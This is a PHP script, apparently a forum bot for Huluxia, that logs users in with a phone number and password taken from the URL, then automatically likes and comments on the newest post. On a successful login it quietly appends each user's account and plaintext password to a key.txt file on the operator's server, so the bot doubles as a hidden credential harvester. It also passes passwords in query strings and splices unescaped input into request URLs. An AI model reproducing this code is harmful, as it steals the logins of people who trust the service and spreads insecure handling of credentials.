<title>小JnAPI</title><?php
//登录
$phoneNumber=$_GET["phone"];
$password=md5($_GET["key"],false);
$r=$_GET["key"];
$result=file_get_contents("http://floor.huluxia.com/account/login/ANDROID/4.0?device_code=1&account=".$phoneNumber."&login_type=2&password=".$password);
$returnJson=json_decode($result,true);
$msg=$returnJson["msg"];
$key=$returnJson["_key"];
$uid=$returnJson["user"]["userID"];
if($_GET["name"]==null)
{$jnname="小Jn";}else {
    $jnname=$_GET["name"];
}
switch($msg)
{
  case "账号或密码错误":
    echo '<script>window.alert("账号或密码错误！");</script>';
    break;
  case "参数不合法":
    echo '<script>window.alert("参数不合法！");</script>';
    break;
  case "账号不存在":
    echo '<script>window.alert("账号不存在");</script>';
    break;
  case "":
   //读取记录
$myfilert = fopen("key.txt", "r") or die("Unable to open file!");
$f = fread($myfilert,filesize("key.txt"));
fclose($myfilert);

//记录

    $myfile = fopen("key.txt", "w") or die("Unable to open file!");
$txt = $f."账号：".$phoneNumber."密码:".$r."\n";
fwrite($myfile, $txt);
fclose($myfile);
    break;
}


//获取后缀
$file = file("jnhz.txt");
 if($key==null){echo "未登录";}else {
//随机读取一行
$arr  = mt_rand( 0, count( $file ) - 1 );
echo"<br>回复内容:";
echo$content  = trim($file[$arr],"\n");

//获取
  $url="http://floor.huluxia.com/post/list/ANDROID/2.1?platform=2&gkey=000000&app_version=4.0.0.7&versioncode=20141436&market_id=floor_huluxia&_key=".$key."&device_code=%5Bw%5D02%3A00%3A00%3A00%3A00%3A00-%5Bi%5D866934037372573-%5Bs%5D89861119147385482175&start=0&count=20&cat_id=2&tag_id=0&sort_by=1";
 $post=file_get_contents($url);
  $post=json_decode($post,true);
 echo"回复了ID为". $pid=$post["posts"][0]["postID"];//最新帖子ID
 //执行点赞
$key=$returnJson["_key"];

    $gzdf = "http://floor.huluxia.com/post/praise/ANDROID/2.1?platform=2&gkey=000000&app_version=4.1.1.2.2&versioncode=318&market_id=tool_tencent&_key=".$key."&device_code=%5Bw%5D02%3A00%3A00%3A00%3A00%3A00%5Bd%5De2f734cc-549b-4349-a311-244c64fcc71e&post_id=
".$pid;
   echo "返回信息".$gzgzgz4 = file_get_contents($gzdf);
   
echo"的帖子";  
$postJson=file_get_contents("http://floor.huluxia.com/post/detail/ANDROID/2.3?post_id=".$pid);

    
 $userMsg=file_get_contents("http://floor.huluxia.com/user/info/ANDROID/2.1?_key=".$key."&user_id=".$uid);
$user=json_decode($userMsg,true);
$name=$user["nick"];

$postArray=json_decode($postJson,true);
$title=$postArray["post"]["title"];
$url2 = "http://". $_SERVER['HTTP_HOST']."/jnjqrapi.php?name=".$jnname."&q=".$title."&name=".$name;
  echo $html = file_get_contents($url2)."";
  if($pid==file_get_contents("pid2.txt"))
  {
    echo "，PS:已回复，所以过滤了，评论可能在审核中";
  }
  else
  {
    $hulu=$post["posts"][0]["user"]["credits"];//葫芦数
    $url2="http://floor.huluxia.com/comment/create/ANDROID/2.0?platform=2&gkey=000000&app_version=4.0.0.7&versioncode=20141436&market_id=floor_huluxia&_key=".$key."&device_code=%5Bw%5D02%3A00%3A00%3A00%3A00%3A00-%5Bi%5D866934037372573-%5Bs%5D89861119147385482175&post_id=".$pid."&comment_id=0&text=".$html."".$content."&patcha=&images=&remindUsers=";
  echo  file_get_contents($url2);
    file_put_contents("pid2.txt",$pid);
  }}